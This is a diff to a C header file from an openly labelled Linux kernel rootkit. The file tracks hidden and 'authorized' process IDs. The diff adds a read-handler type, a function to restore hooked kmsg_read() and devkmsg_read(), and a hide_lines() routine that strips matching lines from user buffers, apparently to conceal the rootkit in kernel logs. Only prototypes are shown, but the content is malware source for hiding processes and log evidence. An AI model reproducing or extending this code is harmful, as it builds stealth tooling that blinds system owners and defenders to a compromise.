@@ -6,6 +6,7 @@
 #include <asm/current.h>
 #include <linux/kstrtox.h>
 #include <linux/types.h>
+#include <linux/uaccess.h>
 #include <vdso/limits.h>
 
 /**
@@ -114,13 +115,14 @@ struct module_sect_attrs {
     struct module_sect_attr attrs[];
 };
 
-
 typedef struct file file_t;
 typedef struct path path_t;
 typedef struct inode inode_t;
 typedef struct dentry dentry_t;
 typedef struct files_struct files_t;
 typedef struct task_struct task_t;
+
+typedef ssize_t (*proc_read_t)(file_t *file, char __user *buf, size_t count, loff_t *ppos);
 
 extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
 // Head of the authorized PIDs linked list (processes that bypass the rootkit)
@@ -237,6 +239,11 @@ long authorize_process(const pid_t i32_pid, const int i32_sig);
 void clear_auth_list(void);
 
 /**
+ * Restores the original `kmsg_read()` and `devkmsg_read()` functions.
+ */
+void restore_kmsg_read(void);
+
+/**
  * If the current process is authorized, return `false`.
  * Otherwise, check if the given PID is hidden.
  *
@@ -248,5 +255,15 @@ static inline bool check_pid_hidden_auth(const pid_t i32_pid)
 {
     return (!is_process_authorized(PID_SELF)) && is_pid_hidden(i32_pid);
 }
+
+/**
+ * Hide lines that contain the given string.
+ *
+ * @param s_buffer The user buffer to hide lines from
+ * @param sz_len   The length of the user buffer
+ * @param s_search The string to search for
+ * @return The new length of the user buffer
+ */
+size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search);
 
 #endif
